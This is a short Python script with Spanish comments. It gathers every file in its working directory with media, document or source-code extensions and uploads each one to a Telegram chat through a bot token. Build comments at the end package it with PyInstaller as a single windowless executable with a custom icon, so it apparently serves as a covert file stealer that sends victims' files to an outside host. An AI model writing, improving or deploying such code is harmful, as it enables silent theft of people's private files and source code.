import os
import asyncio
from telegram import Bot
from telegram.error import TelegramError

BOT_TOKEN = os.getenv('TOKEN')
CHAT_ID = os.getenv('CHATID')

async def upload_file(file_path):
    bot = Bot(token=BOT_TOKEN)
    try:
        with open(file_path, 'rb') as file:
            await bot.send_document(chat_id=CHAT_ID, document=file)
        print(f"Archivo {file_path} enviado con éxito.")
    except TelegramError as e:
        print(f"Error al enviar el archivo: {e}")

async def main():
    # Extensiones de archivos a cargar
    file_extensions = ['.mp3', '.png', '.jpg', '.mp4', '.pdf', '.doc', '.py', '.js', '.jsx', '.html']

    # Obtener el directorio actual
    current_directory = os.getcwd()

    # Recorrer archivos en el directorio actual
    tasks = []
    for file_name in os.listdir(current_directory):
        file_path = os.path.join(current_directory, file_name)
        if os.path.isfile(file_path) and any(file_name.lower().endswith(ext) for ext in file_extensions):
            tasks.append(upload_file(file_path))
        else:
            print(f"El archivo {file_path} no coincide con las extensiones permitidas o no es un archivo.")
    
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())

# pip installer pip install python-telegram-bot
# pip installer pyinstaller
# pyinstaller -F -w -i .\raindrop.ico .\upload_telegram.py
